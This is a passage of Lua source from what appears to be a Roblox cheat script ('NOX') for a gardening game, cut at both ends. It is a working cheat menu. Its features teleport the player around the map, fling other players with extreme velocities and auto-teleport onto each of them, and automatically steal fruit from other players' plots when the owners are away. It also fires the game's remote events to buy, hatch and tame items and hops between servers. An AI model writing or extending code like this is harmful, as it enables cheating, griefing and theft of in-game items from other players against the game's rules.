        TP:Button({Name = "My Garden", Callback = function()
            local cf = plotcenter(myplot())
            if cf then tpto(cf) end
        end})
        local shops = {
            { name = "Seeds", pos = Vector3.new(264, 147, -146) },
            { name = "Gears", pos = Vector3.new(245, 147, -144) },
            { name = "Props", pos = Vector3.new(240, 147, -126) },
            { name = "Guilds", pos = Vector3.new(255, 147, -116) },
            { name = "Sell", pos = Vector3.new(270, 147, -127) },
        }
        for _, s in ipairs(shops) do
            TP:Button({Name = s.name, Callback = function() tpto(CFrame.new(s.pos)) end})
        end
        local tpplayerdd = TP:Dropdown({Name = "TP to Player", Flag = "tpplayer", Items = {}, Multi = false, MaxSize = 100, Callback = function(v) end})
        TP:Button({Name = "Teleport", Callback = function()
            local target = Library.Flags["tpplayer"]
            if not target then return end
            local op = Players:FindFirstChild(target)
            if op and op.Character then
                local orp = op.Character:FindFirstChild("HumanoidRootPart")
                if orp then tpto(orp.CFrame) end
            end
        end})
        task.spawn(function()
            while true do
                local names = {}
                for _, op in ipairs(Players:GetPlayers()) do
                    if op ~= plr then table.insert(names, op.Name) end
                end
                table.sort(names)
                pcall(function() tpplayerdd:Refresh(names) end)
                task.wait(1)
            end
        end)
        local FlingSec = Sub:Section({Name = "Fling", Icon = "zap", Side = "Right"})
        local walkflingGroupConn
        local flingsaved = {}
        FlingSec:Toggle({Name = "Walkfling", Flag = "flingall", Default = false, Callback = function(v)
            Cfg.FlingAll = v
            if not v then
                if threads["fling"] then task.cancel(threads["fling"]) threads["fling"] = nil end
                if walkflingGroupConn then walkflingGroupConn:Disconnect() walkflingGroupConn = nil end
                local cc = plr.Character
                if cc then
                    for _, p in ipairs(cc:GetDescendants()) do
                        if p:IsA("BasePart") then
                            pcall(function()
                                p.Velocity = Vector3.zero
                                p.AssemblyLinearVelocity = Vector3.zero
                                p.AssemblyAngularVelocity = Vector3.zero
                            end)
                        end
                    end
                end
                for c, s in pairs(flingsaved) do
                    if c and c.Parent then
                        pcall(function() c.CanCollide = s.cc end)
                    end
                end
                flingsaved = {}
                return
            end
            if not (char and hrp and hrp.Parent) then Cfg.FlingAll = false return end
            for _, c in ipairs(char:GetDescendants()) do
                if c:IsA("BasePart") then
                    flingsaved[c] = { cc = c.CanCollide }
                    pcall(function() c.CanCollide = false end)
                end
            end
            walkflingGroupConn = RunS.Stepped:Connect(function()
                if not char then return end
                for _, p in ipairs(char:GetDescendants()) do
                    if p:IsA("BasePart") and p.CanCollide then
                        p.CanCollide = false
                    end
                end
            end)
            threads["fling"] = task.spawn(function()
                while Cfg.FlingAll do
                    RunS.Heartbeat:Wait()
                    if not Cfg.FlingAll then break end
                    local cc = plr.Character
                    local h = cc and cc:FindFirstChild("HumanoidRootPart")
                    if h and h.Parent then
                        local oldV = h.Velocity
                        h.Velocity = Vector3.new(100000, 100000, 100000)
                        RunS.RenderStepped:Wait()
                        if h.Parent then h.Velocity = oldV end
                    end
                end
            end)
        end})
        FlingSec:Label("Players near you get flung on contact.", "Left")
        FlingSec:Toggle({Name = "Fling All Players (TP)", Flag = "flingalltp", Default = false, Callback = function(v)
            Cfg.FlingAllTP = v
            if v then
                if not Cfg.FlingAll then
                    Library.Flags["flingall"]:Set(true)
                end
                loop("flingtp", v, function()
                    if not (char and hrp and hrp.Parent) then task.wait(0.5) return end
                    for _, op in ipairs(Players:GetPlayers()) do
                        if not Cfg.FlingAllTP then break end
                        if op == plr then continue end
                        local oc = op.Character
                        if not oc then continue end
                        local orp = oc:FindFirstChild("HumanoidRootPart")
                        if not orp then continue end
                        local dist = (orp.Position - hrp.Position).Magnitude
                        if dist > 1000 then continue end
                        local flung = false
                        local lastPos = orp.Position
                        for attempt = 1, 60 do
                            if not Cfg.FlingAllTP then break end
                            if not (orp and orp.Parent) then flung = true break end
                            local targetVel = Vector3.zero
                            pcall(function() targetVel = orp.AssemblyLinearVelocity end)
                            local ping = 0.05
                            pcall(function() ping = op:GetNetworkPing() end)
                            local predictedPos = orp.Position + targetVel * ping
                            local offset = Vector3.new(math.random(-2, 2), 0, math.random(-2, 2))
                            hrp.CFrame = CFrame.new(predictedPos) + offset
                            hrp.AssemblyLinearVelocity = Vector3.zero
                            task.wait(0.05)
                            local ok, curVel = pcall(function() return orp.AssemblyLinearVelocity end)
                            local curPos = orp.Position
                            local moved = (curPos - lastPos).Magnitude
                            if (ok and curVel and curVel.Magnitude > 300) or moved > 50 then
                                flung = true
                                break
                            end
                            lastPos = curPos
                            if hrp and hrp.Parent then hrp.AssemblyLinearVelocity = Vector3.zero end
                        end
                        if hrp and hrp.Parent then hrp.AssemblyLinearVelocity = Vector3.zero end
                        task.wait(0.1)
                    end
                    task.wait(0.5)
                end)
            else
                if threads["flingtp"] then task.cancel(threads["flingtp"]) threads["flingtp"] = nil end
            end
        end})
        FlingSec:Label("TPs to each player while walkfling is on.", "Left")
        local antiflingConn
        local lastsafecf
        FlingSec:Toggle({Name = "Anti-Fling", Flag = "antifling", Default = false, Callback = function(v)
            Cfg.AntiFling = v
            if not v then
                if antiflingConn then antiflingConn:Disconnect() antiflingConn = nil end
                lastsafecf = nil
                return
            end
            lastsafecf = hrp and hrp.CFrame or nil
            antiflingConn = RunS.Stepped:Connect(function()
                if not (char and hrp and hrp.Parent and hum and hum.Parent) then return end
                if hum.Health <= 0 then return end
                local lv = hrp.AssemblyLinearVelocity
                local av = hrp.AssemblyAngularVelocity
                local ws = hum.WalkSpeed
                local lvmag = lv.Magnitude
                local avmag = av.Magnitude
                if avmag > 30 then
                    hrp.AssemblyAngularVelocity = Vector3.zero
                end
                local maxlinear = math.max(ws * 4, 80)
                if lvmag > maxlinear then
                    local capy = math.clamp(lv.Y, -100, 100)
                    hrp.AssemblyLinearVelocity = Vector3.new(
                        math.clamp(lv.X, -ws, ws),
                        capy,
                        math.clamp(lv.Z, -ws, ws)
                    )
                end
                local state = hum:GetState()
                if state == Enum.HumanoidStateType.Physics
                    or state == Enum.HumanoidStateType.FallingDown
                    or state == Enum.HumanoidStateType.Ragdoll then
                    hum:ChangeState(Enum.HumanoidStateType.GettingUp)
                end
                if lastsafecf then
                    local jumped = (hrp.Position - lastsafecf.Position).Magnitude
                    if jumped > 80 and avmag < 5 and lvmag < maxlinear * 0.5 then
                        hrp.CFrame = lastsafecf
                        hrp.AssemblyLinearVelocity = Vector3.zero
                        hrp.AssemblyAngularVelocity = Vector3.zero
                    end
                end
                if avmag < 20 and lvmag < maxlinear then
                    lastsafecf = hrp.CFrame
                end
            end)
        end})
        FlingSec:Label("Clamps velocity + restores from teleport flings.", "Left")
    end
    do
        local Sub = Pages.main:SubPage({Name = "Steal", Icon = "sword"})
        local CheckSec = Sub:Section({Name = "Plot Checker", Icon = "eye", Side = "Left"})
        local StealSec = Sub:Section({Name = "Auto Steal", Icon = "sword", Side = "Left"})
        local DefendSec = Sub:Section({Name = "Anti-Steal", Icon = "shield", Side = "Right"})
        local NightStatus = Sub:Section({Name = "Night Status", Icon = "moon", Side = "Left"})
        nightLbl = NightStatus:Label("Phase: checking...", "Left")
        CheckSec:Label("Player Plots:", "Left")
        stealInfoLbl = CheckSec:Label("scanning...", "Left")
        for i = 1, 12 do
            stealStatusLabels[i] = CheckSec:Label("", "Left")
        end
        local stolenLbl
        local seednames = {}
        for _, s in ipairs(seeds) do table.insert(seednames, s.n) end
        StealSec:Dropdown({Name = "Preferred Fruits", Flag = "stealmut", Items = seednames, Multi = true, MaxSize = 150, Callback = function(v)
            Cfg.StealMuts = v or {}
        end})
        StealSec:Slider({Name = "Amount Before Banking", Flag = "stealbank", Min = 5, Max = 50, Default = 20, Decimals = 1, Callback = function(v)
            Cfg.StealBank = v
        end})
        StealSec:Toggle({Name = "Auto Steal Fruits", Flag = "autosteal", Default = false, Callback = function(v)
            Cfg.AutoSteal = v
            if not v then
                if threads["steal"] then task.cancel(threads["steal"]) threads["steal"] = nil end
                return
            end
            threads["steal"] = task.spawn(function()
                while Cfg.AutoSteal do
                    if not stealActive() then
                        statlbl:SetText("State: waiting for night...")
                        task.wait(3) continue
                    end
                    local gardens = WS:FindFirstChild("Gardens")
                    if not gardens then task.wait(2) continue end
                    local safePlots = {}
                    for _, plot in ipairs(gardens:GetChildren()) do
                        local uid = plot:GetAttribute("OwnerUserId")
                        if not uid or uid == plr.UserId then continue end
                        if ownerOnPlot(plot) then continue end
                        table.insert(safePlots, plot)
                    end
                    if #safePlots == 0 then
                        statlbl:SetText("State: no safe plots")
                        task.wait(3) continue
                    end
                    local prefsel = {}
                    for _, sn in ipairs(Cfg.StealMuts or {}) do prefsel[sn] = true end
                    local anypref = next(prefsel) == nil
                    local stealPrompts = {}
                    for _, plot in ipairs(safePlots) do
                        for _, desc in ipairs(plot:GetDescendants()) do
                            if desc:IsA("ProximityPrompt") and desc.Name == "StealPrompt" then
                                local harvestPart = desc.Parent
                                if harvestPart and harvestPart:IsA("BasePart") then
                                    local fruitModel = harvestPart.Parent
                                    local seedName = fruitModel and fruitModel:GetAttribute("CorePartName")
                                    if seedName == "Bamboo" then continue end
                                    local value = 0
                                    if seedName and seedbyname[seedName] then
                                        value = seedbyname[seedName].p or 0
                                    end
                                    local size = harvestPart.Size.Magnitude
                                    local preferred = (not anypref) and seedName and prefsel[seedName]
                                    table.insert(stealPrompts, { prompt = desc, part = harvestPart, value = value, size = size, plot = plot, preferred = preferred })
                                end
                            end
                        end
                    end
                    if #stealPrompts == 0 then
                        statlbl:SetText("State: no fruits found")
                        task.wait(2) continue
                    end
                    table.sort(stealPrompts, function(a, b)
                        if a.preferred ~= b.preferred then return a.preferred end
                        if a.size ~= b.size then return a.size > b.size end
                        return (a.value or 0) > (b.value or 0)
                    end)
                    statlbl:SetText(("State: stealing (%d)"):format(#stealPrompts))
                    local stolen = 0
                    local startHealth = hum and hum.Health or 100
                    for _, t in ipairs(stealPrompts) do
                        if not Cfg.AutoSteal then break end
                        if not stealActive() then break end
                        if not (t.prompt and t.prompt.Parent) then continue end
                        if ownerOnPlot(t.plot) then continue end
                        if hrp then
                            hrp.CFrame = CFrame.new(t.part.Position + Vector3.new(0, 3, 0))
                        end
                        task.wait(0.05)
                        pcall(function()
                            if fireproximityprompt then
                                fireproximityprompt(t.prompt, 0, true)
                            end
                        end)
                        stolen += 1
                        Cfg.StolenCount = (Cfg.StolenCount or 0) + 1
                        if stolenLbl then stolenLbl:SetText(("Stolen: %d"):format(Cfg.StolenCount)) end
                        task.wait(0.1)
                        local curHealth = hum and hum.Health or startHealth
                        if curHealth < startHealth then
                            statlbl:SetText("State: damage taken")
                            startHealth = curHealth
                            local myBase = plotInside(myplot())
                            if myBase and hrp then hrp.CFrame = myBase end
                            task.wait(1)
                            startHealth = hum and hum.Health or startHealth
                        end
                        if stolen >= (Cfg.StealBank or 20) then
                            local myBase = plotInside(myplot())
                            if myBase and hrp then
                                hrp.CFrame = myBase
                            end
                            stolen = 0
                            startHealth = hum and hum.Health or startHealth
                            task.wait(0.3)
                        end
                    end
                    local myBase = plotInside(myplot())
                    if myBase and hrp then
                        hrp.CFrame = myBase
                    end
                    statlbl:SetText("State: idle")
                    task.wait(0.5)
                end
            end)
        end})
        StealSec:Label("Goes to largest fruits first.", "Left")
        StealSec:Label("Returns to base periodically.", "Left")
        stolenLbl = StealSec:Label(("Stolen: %d"):format(Cfg.StolenCount or 0), "Left")
        StealSec:Button({Name = "Reset Stats", Callback = function()
            Cfg.StolenCount = 0
            if stolenLbl then stolenLbl:SetText("Stolen: 0") end
        end})
        DefendSec:Toggle({Name = "Anti-Steal", Flag = "autodefend", Default = false, Callback = function(v)
            Cfg.AutoDefend = v
            if not v then
                if threads["defend"] then task.cancel(threads["defend"]) threads["defend"] = nil end
                if defendLbl then defendLbl:SetText("Garden: off") end
                return
            end
            threads["defend"] = task.spawn(function()
                while Cfg.AutoDefend do
                    if not stealActive() then
                        if defendLbl then defendLbl:SetText("Waiting for night...") end
                        task.wait(3) continue
                    end
                    local intruder = intruderInMyPlot()
                    if intruder then
                        local oc = intruder.Character
                        local orp = oc and oc:FindFirstChild("HumanoidRootPart")
                        if orp then
                            local bp = plr:FindFirstChildOfClass("Backpack")
                            local shovel = char and char:FindFirstChild("Shovel")
                            if not shovel then
                                local invshovel = bp and bp:FindFirstChild("Shovel")
                                if invshovel and hum then
                                    pcall(function() hum:EquipTool(invshovel) end)
                                    task.wait(0.1)
                                    shovel = char and char:FindFirstChild("Shovel")
                                end
                            end
                            if hrp then
                                hrp.CFrame = orp.CFrame * CFrame.new(0, 0, -2)
                            end
                            if shovel then
                                local vim = game:GetService("VirtualInputManager")
                                local vp = WS.CurrentCamera.ViewportSize
                                local cx, cy = vp.X - 5, 5
                                pcall(function()
                                    vim:SendMouseButtonEvent(cx, cy, 0, true, game, 0)
                                    vim:SendMouseButtonEvent(cx, cy, 0, false, game, 0)
                                end)
                            end
                            if defendLbl then defendLbl:SetText(("⚔ Hitting " .. intruder.Name)) end
                            task.wait(0.4)
                        end
                    else
                        local plot = myplot()
                        local cf = plotInside(plot)
                        if cf and hrp then
                            hrp.CFrame = cf
                        end
                        if defendLbl then defendLbl:SetText("Garden: defending") end
                        task.wait(0.3)
                    end
                end
            end)
        end})
        defendLbl = DefendSec:Label("Garden: off", "Left")
        DefendSec:Label("Keeps you in your plot permanently.", "Left")
        DefendSec:Toggle({Name = "Shovel Aura", Flag = "shovelaura", Default = false, Callback = function(v)
            Cfg.ShovelAura = v
            if not v then
                if threads["shovelaura"] then task.cancel(threads["shovelaura"]) threads["shovelaura"] = nil end
                return
            end
            threads["shovelaura"] = task.spawn(function()
                while Cfg.ShovelAura do
                    local bp = plr:FindFirstChildOfClass("Backpack")
                    local shovel = char and char:FindFirstChild("Shovel")
                    if not shovel then
                        local invshovel = bp and bp:FindFirstChild("Shovel")
                        if invshovel and hum then
                            pcall(function() hum:EquipTool(invshovel) end)
                            task.wait(0.1)
                            shovel = char and char:FindFirstChild("Shovel")
                        end
                    end
                    if shovel then
                        local cam = WS.CurrentCamera
                        local vp = cam and cam.ViewportSize
                        if vp then
                            local vim = game:GetService("VirtualInputManager")
                            local cx, cy = vp.X - 5, 5
                            pcall(function()
                                vim:SendMouseButtonEvent(cx, cy, 0, true, game, 0)
                                vim:SendMouseButtonEvent(cx, cy, 0, false, game, 0)
                            end)
                        end
                    end
                    task.wait(0.4)
                end
            end)
        end})
    end
    do
        local Sub = Pages.shop:SubPage({Name = "Auto Buy", Icon = "shopping-cart"})
        local SeedBuy = Sub:Section({Name = "Seeds", Icon = "sprout", Side = "Left"})
        local GearBuy = Sub:Section({Name = "Gear", Icon = "wrench", Side = "Right"})
        local seedbuydd = SeedBuy:Dropdown({Name = "Seeds to Auto Buy", Flag = "buyseeds", Items = seedopts, Multi = true, MaxSize = 150, Callback = function(v)
            Cfg.BuySeeds = v or {}
        end})
        SeedBuy:Toggle({Name = "Auto Buy Selected", Flag = "autobuyseed", Default = false, Callback = function(v)
            Cfg.AutoBuySeed = v
            loop("buyseed", v, function()
                local sel = Cfg.BuySeeds or {}
                local bought = 0
                for _, lbl in ipairs(sel) do
                    if not Cfg.AutoBuySeed then break end
                    if bought >= 20 then break end
                    local s = seedbyname[nameoflabel(lbl) or ""]
                    if s then
                        local stock = getstock("SeedShop", s.n)
                        if sheckles() >= s.p and stock > 0 then
                            pcall(function() net.SeedShop.PurchaseSeed:Fire(s.n) end)
                            bought += 1
                            task.wait(0.5)
                        end
                    end
                end
                task.wait(1.5)
            end)
        end})
        local gearbuydd = GearBuy:Dropdown({Name = "Gear to Auto Buy", Flag = "buygears", Items = gearopts, Multi = true, MaxSize = 150, Callback = function(v)
            Cfg.BuyGears = v or {}
        end})
        GearBuy:Toggle({Name = "Auto Buy Selected", Flag = "autobuygear", Default = false, Callback = function(v)
            Cfg.AutoBuyGear = v
            loop("buygear", v, function()
                local sel = Cfg.BuyGears or {}
                local bought = 0
                for _, lbl in ipairs(sel) do
                    if not Cfg.AutoBuyGear then break end
                    if bought >= 20 then break end
                    local g = gearbyname[nameoflabel(lbl) or ""]
                    if g then
                        local stock = getstock("GearShop", g.n)
                        if sheckles() >= g.p and stock > 0 then
                            pcall(function() net.GearShop.PurchaseGear:Fire(g.n) end)
                            bought += 1
                            task.wait(0.5)
                        end
                    end
                end
                task.wait(1.5)
            end)
        end})
        GearBuy:Toggle({Name = "Auto Use All Gears", Flag = "autousegears", Default = false, Callback = function(v)
            Cfg.AutoUseGears = v
            loop("usegears", v, function()
                local bp = plr:FindFirstChildOfClass("Backpack")
                if not (bp and hum and hrp) then task.wait(1) return end
                local remote = RS.SharedModules.Packet.RemoteEvent
                for _, tool in ipairs(bp:GetChildren()) do
                    if not Cfg.AutoUseGears then break end
                    local cat = tool:GetAttribute("MainCategory")
                    if cat == "Gear" or cat == "Mushroom" then
                        pcall(function() hum:EquipTool(tool) end)
                        task.wait(0.15)
                        local equipped = char and char:FindFirstChild(tool.Name)
                        if equipped then
                            local toolName = tool.Name
                            local pos = hrp.Position
                            local buf = buffer.create(2 + 12 + 1 + #toolName)
                            buffer.writeu8(buf, 0, 45)
                            buffer.writeu8(buf, 1, 0)
                            buffer.writef32(buf, 2, pos.X)
                            buffer.writef32(buf, 6, pos.Y)
                            buffer.writef32(buf, 10, pos.Z)
                            buffer.writeu8(buf, 14, #toolName)
                            buffer.writestring(buf, 15, toolName)
                            pcall(function() remote:FireServer(buf, {}) end)
                            task.wait(0.2)
                        end
                    end
                end
                task.wait(2)
            end)
        end})
    end
    do
        local Sub = Pages.shop:SubPage({Name = "Stock", Icon = "list"})
        local SeedStock = Sub:Section({Name = "Seed Stock", Icon = "sprout", Side = "Left"})
        local GearStock = Sub:Section({Name = "Gear Stock", Icon = "wrench", Side = "Right"})
        SeedStock:Label("Live Stock:", "Left")
        seedStockHeader = SeedStock:Label("loading...", "Left")
        seedStockLabels = {}
        for _, s in ipairs(seeds) do
            table.insert(seedStockLabels, SeedStock:Label("", "Left"))
        end
        GearStock:Label("Live Stock:", "Left")
        gearStockHeader = GearStock:Label("loading...", "Left")
        gearStockLabels = {}
        for _, g in ipairs(gears) do
            table.insert(gearStockLabels, GearStock:Label("", "Left"))
        end
    end
    do
        local Sub = Pages.pets:SubPage({Name = "Auto Open", Icon = "egg"})
        local Hatch = Sub:Section({Name = "Eggs & Crates", Icon = "egg", Side = "Left"})
        local Equip = Sub:Section({Name = "Equip", Icon = "heart", Side = "Right"})
        Hatch:Toggle({Name = "Auto Hatch Eggs", Flag = "autohatch", Default = false, Callback = function(v)
            Cfg.AutoHatch = v
            loop("hatch", v, function()
                local sel = Cfg.HatchEggs
                local any = next(sel) == nil
                local eggs = invof("Eggs")
                for name, count in pairs(eggs) do
                    if not Cfg.AutoHatch then break end
                    if (any or sel[name]) and (tonumber(count) or 0) > 0 then
                        pcall(function() net.Egg.OpenEgg:Fire(name) end)
                        task.wait(0.4)
                    end
                end
                task.wait(1)
            end)
        end})
        Hatch:Dropdown({Name = "Egg Types", Flag = "hatcheggs", Items = eggnames, Multi = true, MaxSize = 100, Callback = function(v)
            Cfg.HatchEggs = v or {}
        end})
        Hatch:Toggle({Name = "Auto Open Crates", Flag = "autocrate", Default = false, Callback = function(v)
            Cfg.AutoCrate = v
            loop("crate", v, function()
                local sel = Cfg.OpenCrates
                local any = next(sel) == nil
                local crates = invof("Crates")
                for name, count in pairs(crates) do
                    if not Cfg.AutoCrate then break end
                    if (any or sel[name]) and (tonumber(count) or 0) > 0 then
                        pcall(function() net.Crate.OpenCrate:Fire(name) end)
                        task.wait(0.4)
                    end
                end
                task.wait(1)
            end)
        end})
        local cratedd = Hatch:Dropdown({Name = "Crate Types", Flag = "opencrates", Items = cratenames, Multi = true, MaxSize = 150, Callback = function(v)
            Cfg.OpenCrates = v or {}
        end})
        addsearch(Hatch, cratedd, cratenames)
        Hatch:Toggle({Name = "Auto Open Seed Packs", Flag = "autopack", Default = false, Callback = function(v)
            Cfg.AutoPack = v
            loop("pack", v, function()
                local sel = Cfg.OpenPacks
                local any = next(sel) == nil
                local packs = invof("SeedPacks")
                if next(packs) == nil then packs = invof("Packs") end
                for name, count in pairs(packs) do
                    if not Cfg.AutoPack then break end
                    if (any or sel[name]) and (tonumber(count) or 0) > 0 then
                        pcall(function() net.SeedPack.OpenSeedPack:Fire(name) end)
                        task.wait(0.4)
                    end
                end
                task.wait(1)
            end)
        end})
        local packdd = Hatch:Dropdown({Name = "Pack Types", Flag = "openpacks", Items = packnames, Multi = true, MaxSize = 100, Callback = function(v)
            Cfg.OpenPacks = v or {}
        end})
        addsearch(Hatch, packdd, packnames)
        Equip:Toggle({Name = "Auto Equip Best Pets", Flag = "autoequip", Default = false, Callback = function(v)
            Cfg.AutoEquip = v
            loop("equip", v, function()
                local owned = invof("Pets")
                local sorted = {}
                for name, count in pairs(owned) do
                    if (tonumber(count) or 0) > 0 and petrarity[name] then
                        table.insert(sorted, { n = name, r = petrarityrank[petrarity[name]] or 0 })
                    end
                end
                table.sort(sorted, function(a, b) return a.r > b.r end)
                for i = 1, math.min(#sorted, 8) do
                    pcall(function() net.Pets.RequestEquipByName:Fire(sorted[i].n) end)
                    task.wait(0.1)
                end
                task.wait(8)
            end)
        end})
    end
    do
        local Sub = Pages.pets:SubPage({Name = "Wild Pets", Icon = "rabbit"})
        local Wild = Sub:Section({Name = "Wild Pets on Map", Icon = "rabbit", Side = "Left"})
        local Tame = Sub:Section({Name = "Auto Tame", Icon = "target", Side = "Right"})
        Wild:Label("Live Scan:", "Left")
        wildtxt = Wild:Label("scanning...", "Left")
        wildSlotLabels = {}
        for i = 1, 15 do
            wildSlotLabels[i] = Wild:Label("", "Left")
        end
        Wild:Button({Name = "TP to Nearest", Callback = function()
            local p = wildcache and wildcache[1]
            if p and p.part and hrp then hrp.CFrame = p.part.CFrame + Vector3.new(0, 4, 0) end
        end})
        local wildwatchopts = {}
        for _, p in ipairs(pets) do table.insert(wildwatchopts, p.n) end
        local wilddd = Tame:Dropdown({Name = "Species to Auto Buy", Flag = "wildwatch", Items = wildwatchopts, Multi = true, MaxSize = 100, Callback = function(v)
            Cfg.WildWatch = v or {}
        end})
        addsearch(Tame, wilddd, wildwatchopts)
        Tame:Toggle({Name = "Auto Buy Wild Pets", Flag = "autotamewild", Default = false, Callback = function(v)
            Cfg.AutoTameWild = v
            loop("tamewild", v, function()
                local watch = Cfg.WildWatch
                if next(watch) then
                    for _, p in ipairs(wildcache) do
                        if not Cfg.AutoTameWild then break end
                        if watch[p.name] and p.inst and p.inst.Parent then
                            if p.part and hrp then
                                hrp.CFrame = p.part.CFrame + Vector3.new(0, 4, 0)
                                task.wait(0.15)
                            end
                            local prompt = p.inst:FindFirstChildWhichIsA("ProximityPrompt", true)
                            if prompt and fireproximityprompt then
                                task.spawn(function() pcall(fireproximityprompt, prompt, 1) end)
                            end
                            pcall(function() net.Pets.WildPetTame:Fire(p.inst) end)
                            task.wait(1.2)
                        end
                    end
                end
                task.wait(0.8)
            end)
        end})
    end
    do
        local Sub = Pages.server:SubPage({Name = "Server", Icon = "server"})
        local InfoSec = Sub:Section({Name = "Server Info", Icon = "info", Side = "Left"})
        local ActionSec = Sub:Section({Name = "Actions", Icon = "rocket", Side = "Right"})
        local jobidLbl = InfoSec:Label(("Job ID: %s"):format(game.JobId), "Left")
        InfoSec:Label(("Place ID: %d"):format(game.PlaceId), "Left")
        local playerCountLbl = InfoSec:Label(("Players: %d"):format(#Players:GetPlayers()), "Left")
        task.spawn(function()
            while true do
                if playerCountLbl then
                    playerCountLbl:SetText(("Players: %d"):format(#Players:GetPlayers()))
                end
                task.wait(2)
            end
        end)
        ActionSec:Button({Name = "Copy Job ID", Callback = function()
            pcall(function() setclipboard(game.JobId) end)
            Library:Notification({Title = "NOX", Description = "Job ID copied!", Duration = 2})
        end})
        ActionSec:Button({Name = "Copy Place Link", Callback = function()
            local link = ("https://www.roblox.com/games/%d"):format(game.PlaceId)
            pcall(function() setclipboard(link) end)
            Library:Notification({Title = "NOX", Description = "Place link copied!", Duration = 2})
        end})
        ActionSec:Button({Name = "Rejoin Server", Callback = function()
            pcall(function()
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
            end)
        end})
        ActionSec:Button({Name = "Server Hop", Callback = function()
            task.spawn(function()
                local ok, servers = pcall(function()
                    return game:GetService("HttpService"):JSONDecode(
                        game:HttpGet(("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100"):format(game.PlaceId))
                    ).data
                end)
                if not ok or not servers then return end
                for _, s in ipairs(servers) do
                    if s.id ~= game.JobId and s.playing < s.maxPlayers then
                        pcall(function()
                            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, s.id, plr)
                        end)
                        return
                    end
                end
            end)
        end})
        ActionSec:Button({Name = "Lowest Player Hop", Callback = function()
            task.spawn(function()
                local ok, servers = pcall(function()
                    return game:GetService("HttpService"):JSONDecode(
                        game:HttpGet(("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100"):format(game.PlaceId))
                    ).data
                end)
                if not ok or not servers then return end
                local best
                for _, s in ipairs(servers) do
                    if s.id ~= game.JobId and s.playing < s.maxPlayers then
                        if not best or s.playing < best.playing then best = s end
                    end
                end
                if best then
                    pcall(function()
                        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, best.id, plr)
                    end)
                end
            end)
        end})
        ActionSec:Button({Name = "Highest Player Hop", Callback = function()
            task.spawn(function()
                local ok, servers = pcall(function()
                    return game:GetService("HttpService"):JSONDecode(
                        game:HttpGet(("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100"):format(game.PlaceId))
                    ).data
                end)
                if not ok or not servers then return end
                local best
                for _, s in ipairs(servers) do
                    if s.id ~= game.JobId and s.playing < s.maxPlayers then
                        if not best or s.playing > best.playing then best = s end
                    end
                end
                if best then
                    pcall(function()
                        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, best.id, plr)
                    end)
                end
            end)
        end})
        ActionSec:Button({Name = "Server Info", Callback = function()
            local info = ("Job ID: %s\nPlace ID: %d\nPlayers: %d/%d"):format(
                game.JobId, game.PlaceId, #Players:GetPlayers(), Players.MaxPlayers)
            pcall(function() setclipboard(info) end)
            Library:Notification({Title = "NOX", Description = "Server info copied to clipboard!", Duration = 3})
        end})
    end
    do
        local Sub = Pages.sett:SubPage({Name = "Settings", Icon = "settings"})
        local Menu = Sub:Section({Name = "Menu", Icon = "sliders-horizontal", Side = "Left"})
        local Theming = Sub:Section({Name = "Theming", Icon = "palette", Side = "Right"})
        local Custom = Sub:Section({Name = "Customize", Icon = "paintbrush", Side = "Right"})
        local Configs = Sub:Section({Name = "Configs", Icon = "folder-cog", Side = "Left"})
        Library.MenuKeybind = tostring(Enum.KeyCode.RightShift)
        Menu:Keybind({
            Name = "Menu Keybind",
            Flag = "menubind",
            Default = Enum.KeyCode.RightShift,
            Mode = "Always",
            Callback = function()
                local k = Library.Flags["menubind"] and Library.Flags["menubind"].Key
                if k and k ~= "None" then
                    if not tostring(k):match("^Enum%.") then
                        k = "Enum.KeyCode." .. tostring(k)
                    end
                    Library.MenuKeybind = k
                end
            end
        })
        Menu:Button({Name = "Unload Script", Callback = function()
            for key in pairs(threads) do
                if threads[key] then task.cancel(threads[key]) end
                threads[key] = nil
            end
            antilagRevert()
            Library:Unload()
        end})
        local presets = {}
        for name in pairs(Library.Themes) do
            if name ~= "Default" then presets[#presets + 1] = name end
        end
        table.sort(presets)
        table.insert(presets, 1, "Default")
        local themecpickers = {}
        local applytheme = function(name)
            local theme = Library.Themes[name]
            if not theme then return end
            for k, v in pairs(theme) do
                Library.Theme[k] = v
                Library:ChangeTheme(k, v)
                if themecpickers[k] then
                    themecpickers[k]:Set(v)
                end
            end
        end
        Theming:Dropdown({
            Name = "Preset",
            Flag = "themepreset",
            Items = presets,
            Default = "Default",
            Multi = false,
            MaxSize = 110,
            Callback = function(v) applytheme(v) end
        })
        for Index, Value in Library.Theme do
            local ext = Custom:Label(Index, "Left"):Colorpicker({
                Name = Index,
                Flag = "Theme" .. Index,
                Default = Value,
                Callback = function(c)
                    Library.Theme[Index] = c
                    Library:ChangeTheme(Index, c)
                end
            })
            themecpickers[Index] = ext
        end
        local autopath = Library.Folders.Directory .. "/autoload.json"
        local getauto = function()
            if not isfile(autopath) then return "" end
            local raw = readfile(autopath)
            if raw == "" then return "" end
            return raw
        end
        local ConfigName
        local ConfigSelected
        local AutoLabel
        local Dropdown = Configs:Dropdown({Name = "Configs", Flag = "cfglist", Items = {}, Multi = false, MaxSize = 85, Callback = function(v) ConfigSelected = v end})
        Configs:Textbox({Name = "Config Name", Flag = "cfgname", Default = "", Placeholder = "...", Callback = function(v) ConfigName = v end})
        local accenthex = string.format("#%02x%02x%02x", math.floor(Library.Theme.Accent.R * 255), math.floor(Library.Theme.Accent.G * 255), math.floor(Library.Theme.Accent.B * 255))
        local fmtauto = function(name)
            if not name or name == "" then
                return "Autoload: <font color='#808080'>none</font>"
            end
            return "Autoload: <font color='" .. accenthex .. "'>" .. name .. "</font>"
        end
        Configs:Button({Name = "Load", Callback = function()
            if not ConfigSelected then return end
            Library:LoadConfig(readfile(Library.Folders.Configs .. "/" .. ConfigSelected))
            Library:Thread(function()
                task.wait(0.1)
                for k in Library.Theme do
                    if Library.Flags["Theme" .. k] then
                        Library.Theme[k] = Library.Flags["Theme" .. k].Color
                        Library:ChangeTheme(k, Library.Flags["Theme" .. k].Color)
                    end
                end
            end)
        end}):SubButton({Name = "Save", Callback = function()
            if not ConfigSelected then return end
            Library:SaveConfig(ConfigSelected)
        end})
        Configs:Button({Name = "Create", Callback = function()
            if not ConfigName or ConfigName == "" then return end
